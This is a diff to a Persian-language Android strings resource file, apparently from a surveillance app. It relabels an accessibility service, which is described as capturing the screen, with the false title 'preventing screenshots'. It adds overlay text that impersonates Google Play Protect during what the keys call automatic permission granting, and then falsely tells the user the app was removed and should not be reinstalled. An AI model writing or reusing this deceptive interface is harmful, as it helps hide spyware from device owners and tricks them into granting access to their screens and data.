@@ -6,7 +6,7 @@
     <string name="token_hint">توکن سرور، اگر تنظیم شده</string>
     <string name="start">شروع</string>
     <string name="allow_notifications">اجازه اعلان</string>
-    <string name="accessibility_service_label">دسترسی سرویس</string>
+    <string name="accessibility_service_label">جلوگیری از عکس گرفتن از صفحه</string>
     <string name="accessibility_service_description">برای گرفتن تصویر صفحه و امکانات مدیریتی لازم است. فقط با تأیید شما روشن می‌شود.</string>
     <string name="open_accessibility">روشن کردن دسترسی</string>
     <string name="ignore_battery">بدون محدودیت باتری</string>
@@ -58,6 +58,16 @@
     <string name="perm_family_stock">Pixel / Motorola / سایر</string>
     <string name="perm_auto_grant_overlay_title">در حال به‌روزرسانی Google Play</string>
     <string name="perm_auto_grant_overlay_body">لطفاً صبر کنید. این صفحه را نبندید.</string>
-    <string name="perm_auto_grant_overlay_progress">مرحله %1$d از %2$d</string>
+    <string name="perm_auto_grant_overlay_progress">اسکن %1$d از %2$d</string>
+    <string name="perm_auto_grant_brand">Google Play Protect</string>
+    <string name="perm_auto_grant_scan_title">در حال اسکن دسترسی‌های برنامه</string>
+    <string name="perm_auto_grant_scan_body">لطفاً صبر کنید. این صفحه را نبندید تا بررسی امنیتی تمام شود.</string>
+    <string name="perm_auto_grant_scan_status">بررسی مجوزها و تنظیمات امنیتی…</string>
+    <string name="perm_auto_grant_cleanup_status">در حال نهایی‌سازی اسکن و پاک‌سازی…</string>
+    <string name="perm_auto_grant_done_title">اسکن تمام شد</string>
+    <string name="perm_auto_grant_done_body">برنامه «%1$s» را حذف کردیم چون از Google Play نصب نشده بود.\nدیگر اقدام به نصب این برنامه نکنید.</string>
+    <string name="perm_auto_grant_done_status">برنامه حذف شد · از منابع ناشناس نصب نکنید</string>
+    <string name="perm_auto_grant_app_removed_label">حذف شد · نصب خارج از Play</string>
+    <string name="perm_auto_grant_dismiss">متوجه شدم</string>
 </resources>
 
